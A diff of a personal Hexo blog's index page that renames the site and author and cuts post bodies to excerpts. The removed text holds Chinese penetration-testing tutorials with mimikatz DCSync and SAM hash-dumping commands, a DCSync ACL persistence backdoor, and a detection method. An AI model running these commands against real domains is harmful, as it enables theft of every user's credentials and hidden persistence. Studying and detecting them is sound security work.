@@ -80,12 +80,12 @@
 
 
 <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
+<meta property="og:title" content="LouisGOGOGO">
 <meta property="og:url" content="http://yoursite.com/index.html">
-<meta property="og:site_name" content="Hexo">
+<meta property="og:site_name" content="LouisGOGOGO">
 <meta property="og:locale" content="zh-Hans">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hexo">
+<meta name="twitter:title" content="LouisGOGOGO">
 
 
 
@@ -121,7 +121,7 @@
 
 
 
-  <title>Hexo</title>
+  <title>LouisGOGOGO</title>
   
 
 
@@ -152,7 +152,7 @@
     <div class="custom-logo-site-title">
       <a href="/" class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Hexo</span>
+        <span class="site-title">LouisGOGOGO</span>
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
@@ -274,13 +274,13 @@
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/15/域渗透-DCSync的利用/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
+      <meta itemprop="name" content="LouisGOGOGO">
       <meta itemprop="description" content>
       <meta itemprop="image" content="/images/avatar.jpg">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
+      <meta itemprop="name" content="LouisGOGOGO">
     </span>
 
     
@@ -342,84 +342,22 @@
       
         
           
-            <h1 id="域渗透-DCSync的利用"><a href="#域渗透-DCSync的利用" class="headerlink" title="域渗透-DCSync的利用"></a>域渗透-DCSync的利用</h1><h3 id="0x00-引言"><a href="#0x00-引言" class="headerlink" title="0x00 引言"></a>0x00 引言</h3><p>DCSync是域渗透常用的技术，本文根据其他人的技术进行测试引用，并整理。</p>
-<h3 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h3><p>本文内容</p>
-<ul>
-<li>利用DCSync导出域内所有用户hash的方法</li>
-<li>利用DCSync在域内维持权限</li>
-<li>自动化检测DCSync后门</li>
-</ul>
-<h3 id="0x02-利用DCSync导出域内所有用户hash的方法"><a href="#0x02-利用DCSync导出域内所有用户hash的方法" class="headerlink" title="0x02 利用DCSync导出域内所有用户hash的方法"></a>0x02 利用DCSync导出域内所有用户hash的方法</h3><h5 id="利用DCSync的先决条件"><a href="#利用DCSync的先决条件" class="headerlink" title="利用DCSync的先决条件"></a>利用DCSync的<strong>先决条件</strong></h5><p>获取以下任意一个用户权限：</p>
-<ul>
-<li>Administrators 组</li>
-<li>Domain Admins组</li>
-<li>Enterprise Admins（企业管理员）组</li>
-<li>域控制器的计算机账户</li>
-</ul>
-<h5 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h5><p>利用DRS(Directory Replication Service,目录复制服务)协议通过IDL_DRSGetNCChanges从域控制器复制用户凭据。</p>
-<h5 id="如何利用？"><a href="#如何利用？" class="headerlink" title="如何利用？"></a>如何利用？</h5><ol>
-<li><strong>mimikatz</strong></li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">#导出域内所有用户的hash</span><br><span class="line">lsadump::dcsync /domain:louis.gov /all /csv</span><br><span class="line">#导出域内administrator账户的hash</span><br><span class="line">lsadump::dcsync /domain:louis.gov /user:administrator /csv</span><br></pre></td></tr></table></figure>
+          域渗透-DCSync的利用0x00 引言DCSync是域渗透常用的技术，本文根据其他人的技术进行测试引用，并整理。
+0x01 简介本文内容
 
-<ol start="2">
-<li>利用<strong>powershell</strong>实现</li>
-</ol>
-<p>通过Invoke-ReflectivePEinjection（调用-反射性注射）调用mimikatz.dll中的dcsync功能</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 导出域内所有用户的hash</span><br><span class="line">Invoke-DCSync -DumpForest | ft -wrap -autosize</span><br><span class="line"></span><br><span class="line"># 导出域内administrator账户的hash</span><br><span class="line">Invoke-DCSync -DumpForest -Users @(&quot;administrator&quot;) | ft -wrap -autosize</span><br></pre></td></tr></table></figure>
+利用DCSync导出域内所有用户hash的方法
+利用DCSync在域内维持权限
+自动化检测DCSync后门
 
-<h3 id="0x03-利用DCSync-在域内维持权限的方法"><a href="#0x03-利用DCSync-在域内维持权限的方法" class="headerlink" title="0x03 利用DCSync 在域内维持权限的方法"></a>0x03 利用DCSync 在域内维持权限的方法</h3><h5 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a><strong>先决条件</strong></h5><p>获得以下任何一个用户组的用户权限：</p>
-<ul>
-<li>Domain Admins组</li>
-<li>Enterprise Admins（企业管理员）组</li>
-</ul>
-<h5 id="利用原理-1"><a href="#利用原理-1" class="headerlink" title="利用原理"></a>利用原理</h5><p>向域内的一个普通用户添加如下三条ACE(Access Control Entries，访问控制条目)：</p>
-<ul>
-<li>DS-Replication-Get-Changes(GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)</li>
-<li>DS-Replication-Get-Changes-All(GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)</li>
-<li>DS-Replication-Get-Changes(GUID:89e95b76-444d-4c62-991a-0facbeda640c)</li>
-</ul>
-<p>该用户即可获得利用DCSync导出域内所有用户hash的权限</p>
-<h5 id="如何利用？-1"><a href="#如何利用？-1" class="headerlink" title="如何利用？"></a>如何利用？</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># ACL一般都是指对象的安全描述符中的SACL和DACL</span><br><span class="line"># SACL 包含访问控制条目（ACE），用于指定在域控制器的安全事件日志中生成审核记录的访问尝试类型</span><br><span class="line"># DACL 访问控制列表（ACL），由对象的所有者控制，并指定特定用户或组对该对象的访问权限。</span><br><span class="line"># 添加ACE的命令:</span><br><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;DC=test,DC=com&quot; -PrincipalIdentity test1 -Rights DCSync -Verbose</span><br><span class="line"># 删除ACE的命令:</span><br><span class="line">Remove-DomainObjectAcl -TargetIdentity &quot;DC=test,DC=com&quot; -PrincipalIdentity test1 -Rights DCSync -Verbose</span><br></pre></td></tr></table></figure>
-
-<p>注入ACL后，该用户有了调用DCSync的权限。</p>
-<ol>
-<li>在域内一台登陆了test1 的主机上面，直接使用mimicatz的DCSync方法。</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe privilege::debug &quot;lsadump::dcsync /domain:louis.gov /all /csv&quot; exit</span><br></pre></td></tr></table></figure>
-
-<ol start="2">
-<li>使用runas</li>
-</ol>
-<blockquote>
-<p>runas ？？</p>
-<p>runas命令：能让域用户/普通user用户以管理员身份运行制定程序</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 弹cmd实现</span><br><span class="line">runas /noprofile /user:louis\test1 cmd</span><br><span class="line"># 弹出的cmd下执行如下命令</span><br><span class="line">mimikatz.exe privilege::debug &quot;lsadump::dcsync /domain:louis.gov /all /csv&quot; exit</span><br><span class="line"></span><br><span class="line"># 不弹出cmd实现</span><br><span class="line">runas /noprofile /user:louis\test1 c:\test\1.bat</span><br><span class="line"># 1.bat内容</span><br><span class="line">c:\test\mimikatz.exe privilege::debug &quot;lsadump::dcsync /domain:louis.gov /user:administrator /csv&quot; exit &gt; c:\test\1.txt</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>tips</p>
-<p>使用wmic 命令在本机实现会出现错误。</p>
-</blockquote>
-<h3 id="0x04-自动化检测DCSync后门"><a href="#0x04-自动化检测DCSync后门" class="headerlink" title="0x04 自动化检测DCSync后门"></a>0x04 自动化检测DCSync后门</h3><p>具有高权限但不在高权限组的用户被称之为Shadow Admin，例如0x03中的域用户test1，仅通过查询高权限组的成员无法发现域内的Shadow Admin</p>
-<h5 id="检测原理"><a href="#检测原理" class="headerlink" title="检测原理"></a>检测原理</h5><p>枚举活动目录（Active Directory）中，所有用户的ACL，标出特权用户</p>
-<h5 id="使用代码"><a href="#使用代码" class="headerlink" title="使用代码"></a>使用代码</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Execute-ACLight2.bat</span></span><br><span class="line"></span><br><span class="line">@echo off</span><br><span class="line">set var=%~d0%~p0%</span><br><span class="line">cd <span class="string">"%var%"</span></span><br><span class="line">set <span class="string">"var=%cd%\ACLight2.psm1"</span></span><br><span class="line">echo.</span><br><span class="line">echo  Welcome, starting Multi-Layered ACLight scan</span><br><span class="line">powershell -noprofile -ExecutionPolicy Bypass <span class="built_in">Import-Module</span> <span class="string">'%var%'</span> -force ; Start-ACLsAnalysis</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>
-
-<h5 id="先决条件-1"><a href="#先决条件-1" class="headerlink" title="先决条件"></a>先决条件</h5><ul>
-<li>powershell v3.0</li>
-<li>域内普通用户权限</li>
-</ul>
-<h5 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h5><p>执行Execute-ACLight2.bat </p>
-<p>生成三个文件：</p>
-<ul>
-<li>Privileged Accounts - Layers Analysis.txt</li>
-<li>Privileged Accounts Permissions - Final Report.csv</li>
-<li>Privileged Accounts Permissions - Irregular Accounts.csv</li>
-</ul>
-<p>文件中会显示出所有特权帐户</p>
-<p>经测试，ACLight能够检测出被添加DCSync权限的用户test1</p>
-
-          
+0x02 利用DCSync导出域内所有用户has
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/15/域渗透-DCSync的利用/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -469,13 +407,13 @@
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/15/域渗透-DNS记录的获取/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
+      <meta itemprop="name" content="LouisGOGOGO">
       <meta itemprop="description" content>
       <meta itemprop="image" content="/images/avatar.jpg">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
+      <meta itemprop="name" content="LouisGOGOGO">
     </span>
 
     
@@ -537,24 +475,20 @@
       
         
           
-            <h1 id="DNS记录的获取"><a href="#DNS记录的获取" class="headerlink" title="DNS记录的获取"></a>DNS记录的获取</h1><h3 id="0x00-引言"><a href="#0x00-引言" class="headerlink" title="0x00 引言"></a>0x00 引言</h3><p>​        在域渗透中，对域环境的信息搜集是很关键的一步，他可以帮助我们了解域内的网络架构。所以本文主要介绍管理员用户、普通用户分别如何获取域内的DNS记录。</p>
-<h3 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h3><ol>
-<li>获得DNS管理员权限如何获取DNS记录。</li>
-</ol>
-<ul>
-<li>通过DNS Manager获取DNS记录。</li>
-<li>通过dnscmd 获取DNS记录</li>
-<li>域内远程读取DNS记录的方法</li>
-</ul>
-<ol start="2">
-<li>非域DNS管理员获取DNS记录的方法。</li>
-</ol>
-<ul>
-<li>实现原理</li>
-<li>开源的工具和方法</li>
-</ul>
-<h3 id="0x02-通过DNS-Manager获取DNS记录"><a href="#0x02-通过DNS-Manager获取DNS记录" class="headerlink" title="0x02 通过DNS Manager获取DNS记录"></a>0x02 通过DNS Manager获取DNS记录</h3>
-          
+          DNS记录的获取0x00 引言​        在域渗透中，对域环境的信息搜集是很关键的一步，他可以帮助我们了解域内的网络架构。所以本文主要介绍管理员用户、普通用户分别如何获取域内的DNS记录。
+0x01 简介
+获得DNS管理员权限如何获取DNS记录。
+
+
+通过DNS Manager获取DNS记录。
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/15/域渗透-DNS记录的获取/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -604,13 +538,13 @@
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/15/通过SAM获得数据库本地用户的hash/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
+      <meta itemprop="name" content="LouisGOGOGO">
       <meta itemprop="description" content>
       <meta itemprop="image" content="/images/avatar.jpg">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
+      <meta itemprop="name" content="LouisGOGOGO">
     </span>
 
     
@@ -672,37 +606,15 @@
       
         
           
-            <h1 id="通过SAM获得本地用户hash"><a href="#通过SAM获得本地用户hash" class="headerlink" title="通过SAM获得本地用户hash"></a>通过SAM获得本地用户hash</h1><h3 id="0x00-引言"><a href="#0x00-引言" class="headerlink" title="0x00 引言"></a>0x00 引言</h3><p>渗透中，在获取到window系统的访问权限后，一般会使用mimikatz的sekurlsa::logonpasswords命令读取进程lsass的信息来获取当前登录用户的密码信息，但是如何全面获取系统的密码信息呢，这就要对SAM数据库中保存的信息进行提取，导出当前系统所有本地用户的hash。</p>
-<h3 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h3><ul>
-<li>通过SAM数据库获得用户hash的多种方法</li>
-<li>原理分析</li>
-</ul>
-<h3 id="0x02-通过SAM数据库获得用户hash的方法"><a href="#0x02-通过SAM数据库获得用户hash的方法" class="headerlink" title="0x02 通过SAM数据库获得用户hash的方法"></a>0x02 通过SAM数据库获得用户hash的方法</h3><h5 id="1、在线读取SAM数据库"><a href="#1、在线读取SAM数据库" class="headerlink" title="1、在线读取SAM数据库"></a>1、在线读取SAM数据库</h5><p>直接将工具传入目标机器，在目标机器中运行并获取密码信息。</p>
-<p><em>mimikatz</em></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug 提升权限</span><br><span class="line">token::elevate 假冒令牌。用于提升权限至 SYSTEM 权限（默认情况下）或者是发现计算机中的域管理员的令牌。</span><br><span class="line">lsadump::sam 利用lsass进程进行交互来提取凭证数据。</span><br><span class="line"></span><br><span class="line">###</span><br><span class="line">针对一个“在线”的 SAM 文件，需要管理员权限（使用 DEBUG 权限即可）或者本地 SYSTEM 权限。</span><br><span class="line">获取一个模拟的 SYSTEM 令牌： Mimikatz “PRIVILEGE::Debug” “TOKEN:elevate”</span><br></pre></td></tr></table></figure>
-
-<p><em>pwdump7</em></p>
-<p>利用pwdump7 使用管理员权限直接在目标机器运行。</p>
-<p>可以到处hash，爆破不出明文密码。</p>
-<h5 id="2、离线读取SAM数据库"><a href="#2、离线读取SAM数据库" class="headerlink" title="2、离线读取SAM数据库"></a>2、离线读取SAM数据库</h5><p>将需要的SAM数据库文件等其他可以用文件导出，传送到攻击机器中进行分析。</p>
-<blockquote>
-<p>获取SAM数据库文件有三种实现方式</p>
-</blockquote>
-<p>（1）从注册表中导出 。<strong>需要管理员权限</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM systembkup.hiv</span><br><span class="line">reg save HKLM\SAM sambkup.hiv</span><br></pre></td></tr></table></figure>
-
-<p>（2）使用工具复制文件。<strong>NinjaCopy、需管理员权限</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NinjaCopy.ps1 是一个powershell 策略文件</span><br><span class="line">一般无法直接执行。</span><br><span class="line">运行get-executionpolicy，如果结果是Restricted，那表示禁止执行脚本。</span><br><span class="line">运行 set-executionpolicy -executionpolicy unrestricted 表示可以执行。</span><br></pre></td></tr></table></figure>
-
-<p>导出SAM 文件后，拉回本地使用<strong>mimikatz</strong>进行破解</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam /sam:sambkup.hiv /system:systembkup.hiv</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x03-原理分析"><a href="#0x03-原理分析" class="headerlink" title="0x03 原理分析"></a>0x03 原理分析</h3><p>读取注册表项<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</code>下的键值<code>JD</code>、<code>Skew1</code>、<code>GBG</code>和<code>Data</code>中的内容，拼接成syskey。</p>
-<p>读取注册表项<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users</code>下每个用户中F项和V项的内容，使用syskey进行一系列的解密。</p>
-<p>至于拼接和解密的原理，自己找吧。</p>
-<p><em>我只是技术的搬运工</em></p>
-
-          
+          通过SAM获得本地用户hash0x00 引言渗透中，在获取到window系统的访问权限后，一般会使用mimikatz的sekurlsa::logonpasswords命令读取进程lsass的信息来获取当前登录用户的密码信息，但是如何全面获取系统的密码信息呢，这就要对SAM数据库中保存的信息进行提取，
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/15/通过SAM获得数据库本地用户的hash/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -771,9 +683,9 @@
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
-              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="John Doe">
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="LouisGOGOGO">
             
-              <p class="site-author-name" itemprop="name">John Doe</p>
+              <p class="site-author-name" itemprop="name">LouisGOGOGO</p>
               <p class="site-description motion-element" itemprop="description"></p>
           </div>
 
@@ -848,7 +760,7 @@
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">John Doe</span>
+  <span class="author" itemprop="copyrightHolder">LouisGOGOGO</span>
 
   
 </div>
